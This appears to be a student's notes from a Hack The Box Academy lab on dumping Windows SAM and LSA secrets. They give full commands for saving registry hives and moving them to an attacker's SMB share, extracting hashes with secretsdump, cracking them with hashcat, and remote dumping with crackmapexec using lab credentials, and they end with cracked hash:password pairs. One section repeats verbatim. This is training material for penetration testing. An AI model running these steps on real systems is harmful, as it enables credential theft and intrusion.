#### Copying SAM Registry Hives

There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:

|Registry Hive|Description|
|---|---|
|`hklm\sam`|Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.|
|`hklm\system`|Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.|
|`hklm\security`|Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.|

We can create backups of these hives using the `reg.exe` utility.

#### Using reg.exe save to Copy Registry Hives

Launching CMD as an admin will allow us to run reg.exe to save copies of the aforementioned registry hives. Run these commands below to do so:

  Attacking SAM

```cmd-session
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

Technically we will only need `hklm\sam` & `hklm\system`, but `hklm\security` can also be helpful to save as it can contain hashes associated with cached domain user account credentials present on domain-joined hosts. Once the hives are saved offline, we can use various methods to transfer them to our attack host. In this case, let's use [Impacket's smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) in combination with some useful CMD commands to move the hive copies to a share created on our attack host.


#### Creating a Share with smbserver.py

All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (`CompData`) and specify the directory on our attack host where the share will be storing the hive copies (`/home/ltnbob/Documents`). Know that the `smb2support` option will ensure that newer versions of SMB are supported. If we do not use this flag, there will be errors when connecting from the Windows target to the share hosted on our attack host. Newer versions of Windows do not support SMBv1 by default because of the [numerous severe vulnerabilites](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) and publicly available exploits.#### Creating a Share with smbserver.py

All we must do to create the share is run smbserver.py -smb2support using python, give the share a name (`CompData`) and specify the directory on our attack host where the share will be storing the hive copies (`/home/ltnbob/Documents`). Know that the `smb2support` option will ensure that newer versions of SMB are supported. If we do not use this flag, there will be errors when connecting from the Windows target to the share hosted on our attack host. Newer versions of Windows do not support SMBv1 by default because of the [numerous severe vulnerabilites](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=smbv1) and publicly available exploits.

```shell-session
pepedavidphone@htb[/htb]$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support CompData /home/ltnbob/Documents/
```
Once we have the share running on our attack host, we can use the `move` command on the Windows target to move the hive copies to the share.

#### Moving Hive Copies to Share

  Attacking SAM

```cmd-session
C:\> move sam.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move security.save \\10.10.15.16\CompData
        1 file(s) moved.

C:\> move system.save \\10.10.15.16\CompData
        1 file(s) moved.
```
## Dumping Hashes with Impacket's secretsdump.py

One incredibly useful tool we can use to dump the hashes offline is Impacket's `secretsdump.py`. Impacket can be found on most modern penetration testing distributions. We can check for it by using `locate` on a Linux-based system:

#### Locating secretsdump.py

```shell-session
pepedavidphone@htb[/htb]$ locate secretsdump 
```
Using secretsdump.py is a simple process. All we must do is run secretsdump.py using Python, then specify each hive file we retrieved from the target host.

#### Running secretsdump.py
```shell-session
pepedavidphone@htb[/htb]$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```
![[Pasted image 20250515125455.png]]
Here we see that secretsdump successfully dumps the `local` SAM hashes and would've also dumped the cached domain logon information if the target was domain-joined and had cached credentials present in hklm\security. Notice the first step secretsdump executes is targeting the `system bootkey` before proceeding to dump the `LOCAL SAM hashes`. It cannot dump those hashes without the boot key because that boot key is used to encrypt & decrypt the SAM database, which is why it is important for us to have copies of the registry hives we discussed earlier in this section. Notice at the top of the secretsdump.py output:
```shell-session
Dumping local SAM hashes (uid:rid:lmhash:nthash)
```
This tells us how to read the output and what hashes we can crack. Most modern Windows operating systems store the password as an NT hash. Operating systems older than Windows Vista & Windows Server 2008 store passwords as an LM hash, so we may only benefit from cracking those if our target is an older Windows OS.

Knowing this, we can copy the NT hashes associated with each user account into a text file and start cracking passwords. It may be beneficial to make a note of each user, so we know which password is associated with which user account.

## Cracking Hashes with Hashcat
#### Adding nthashes to a .txt File
![[Pasted image 20250515125648.png]]

#### Running Hashcat against NT Hashes
Hashcat has many different modes we can use. Selecting a mode is largely dependent on the type of attack and hash type we want to crack. Covering each mode is beyond the scope of this module. We will focus on using `-m` to select the hash type `1000` to crack our NT hashes (also referred to as NTLM-based hashes). We can refer to Hashcat's [wiki page](https://hashcat.net/wiki/doku.php?id=example_hashes) or the man page to see the supported hash types and their associated number. We will use the infamous rockyou.txt wordlist mentioned in the `Credential Storage` section of this module.

```shell-session
pepedavidphone@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt
```
![[Pasted image 20250515125730.png]]We can see from the output that Hashcat used a type of attack called a [dictionary attack](https://en.wikipedia.org/wiki/Dictionary_attack) to rapidly guess the passwords utilizing a list of known passwords (rockyou.txt) and was successful in cracking 3 of the hashes. Having the passwords could be useful to us in many ways. We could attempt to use the passwords we cracked to access other systems on the network. It is very common for people to re-use passwords across different work & personal accounts. Knowing this technique, we covered can be useful on engagements. We will benefit from using this any time we come across a vulnerable Windows system and gain admin rights to dump the SAM database.

Keep in mind that this is a well-known technique, so admins may have safeguards to prevent and detect it. We can see some of these ways [documented](https://attack.mitre.org/techniques/T1003/002/) within the MITRE attack framework.

## Remote Dumping & LSA Secrets Considerations

With access to credentials with `local admin privileges`, it is also possible for us to target LSA Secrets over the network. This could allow us to extract credentials from a running service, scheduled task, or application that uses LSA secrets to store passwords.

#### Dumping LSA Secrets Remotely

```shell-session
pepedavidphone@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
![[Pasted image 20250515125842.png]]
#### Dumping SAM Remotely

```shell-session
pepedavidphone@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```
![[Pasted image 20250515125911.png]]

c02478537b9727d391bc80011c2e2321:matrix                   
31d6cfe0d16ae931b73c59d7e0c089c0:                         
58a478135a93ac3bf058a5ea0e8fdb71:Password123 